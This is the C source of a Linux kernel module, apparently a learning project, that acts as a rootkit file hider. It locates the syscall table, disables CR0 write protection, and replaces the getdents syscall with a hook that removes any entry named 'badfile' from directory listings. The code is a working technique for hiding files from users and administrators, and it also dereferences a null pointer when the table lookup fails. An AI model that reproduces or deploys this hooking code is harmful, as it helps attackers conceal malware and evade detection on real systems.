#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/unistd.h>
#include <linux/dirent.h>
#include <linux/syscalls.h>
#include <asm/cacheflush.h> 
#include <linux/slab.h>
#include <linux/sched.h>

#define BAD_FILE_NAME ("badfile")

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Noam");
MODULE_DESCRIPTION("Basic Kernel Module");

struct linux_dirent {
    long            d_ino;
    off_t           d_off;
    unsigned short  d_reclen;
    char            d_name[];
};

/*
Turns off the 16 bit in the cr0 register (i.e. WP bit)
*/
static void turn_off_write_protection(void)
{
    unsigned long cr0_register = read_cr0();
    clear_bit(16, &cr0_register);
    write_cr0(cr0_register);
}

/*
Turns on the 16 bit in the cr0 register (i.e. WP bit)
*/
static void turn_on_write_protection(void)
{
    unsigned long cr0_register = read_cr0();
    set_bit(16, &cr0_register);
    write_cr0(cr0_register);
}

unsigned long * p_sys_call_table;
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent __user *dir_pointer, unsigned int count);

/*
The fake get_dents syscall which we will use instead of the original one so we could hide specific files.
*/
asmlinkage int fake_getdents(unsigned int fd, struct linux_dirent __user *dir_pointer, unsigned int count)
{
    int returned_bytes = original_getdents(fd, dir_pointer, count);
    if (returned_bytes <= 0)
    {
        pr_info("dir call is empty\n");
        return returned_bytes;
    }

    struct linux_dirent * kernel_dir_pointer = kvmalloc(returned_bytes, GFP_KERNEL);
    if (kernel_dir_pointer == NULL)
    {
        pr_info("error getting kernel memory for entries\n");
        return returned_bytes;
    }

    copy_from_user(kernel_dir_pointer, dir_pointer, returned_bytes);

    int offset = 0;
    unsigned short curr_entry_len = 0;
    struct linux_dirent * curr_dir_entry = kernel_dir_pointer;
    while (offset < returned_bytes)
    {
        pr_info("check: %s\n", curr_dir_entry->d_name);
        curr_entry_len = curr_dir_entry->d_reclen;
        if (!strcmp(curr_dir_entry->d_name, BAD_FILE_NAME))
        {
            pr_info("found one! %s\n", curr_dir_entry->d_name);
            returned_bytes -= curr_entry_len;
            memmove(curr_dir_entry, (void *)curr_dir_entry + curr_entry_len, returned_bytes - offset);
            continue;
        }
        offset += curr_entry_len;
        curr_dir_entry = (void *)kernel_dir_pointer + offset;
    }

    copy_to_user(dir_pointer, kernel_dir_pointer, returned_bytes);

    kvfree(kernel_dir_pointer);
    return returned_bytes;
}


static int __init hook_init(void)
{
    p_sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
    if (p_sys_call_table == NULL)
    {
        pr_info("error with getting syscall table from kall_syms_lookup_name func\n    ");
    }
    original_getdents = (void *)p_sys_call_table[__NR_getdents];
    turn_off_write_protection();
    p_sys_call_table[__NR_getdents] = (unsigned long)fake_getdents;
    turn_on_write_protection();
    return 0;
}

static void __exit hook_exit(void)
{
    turn_off_write_protection();
    p_sys_call_table[__NR_getdents] = (unsigned long)original_getdents;
    turn_on_write_protection();
    pr_info("Goodbye, world!\n");
}

module_init(hook_init);
module_exit(hook_exit);
